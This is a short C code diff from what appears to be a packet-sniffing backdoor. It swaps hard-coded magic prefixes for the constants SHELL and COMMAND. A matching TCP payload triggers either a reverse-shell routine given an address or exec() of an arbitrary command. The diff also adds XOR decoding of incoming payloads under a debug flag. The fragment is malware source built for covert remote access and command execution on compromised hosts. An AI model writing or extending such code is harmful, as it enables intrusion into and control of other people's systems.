@@ -4,12 +4,12 @@ void compare(int payloadLength, char* data)
 {
 	if (payloadLength > 6)
 	{
-		if (strncmp(data, "FC-SH-", 6) == 0)
+		if (strncmp(data, SHELL, 6) == 0)
 		{
 			char* rip = (char*)data + 6;
 			rev(rip);
 		}
-		else if (strncmp(data, "FC-CM-", 6) == 0)
+		else if (strncmp(data, COMMAND, 6) == 0)
 		{
 			char* cmd = (char*)data + 6;
 			exec(cmd);
@@ -29,6 +29,9 @@ void handleTCP(char* buffer, struct ip_hdr_s* ip_header) {
 			char* data = (char*)(buffer + BUFFER_OFFSET_TCP_DATA);
 			int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_TCP;
 			data[payloadLength - 1] = '\0';
+#ifdef DEBUG
+            XORCipher(data, XOR_KEY, payloadLength);
+#endif
 			compare(payloadLength, data);
 		}
 	}
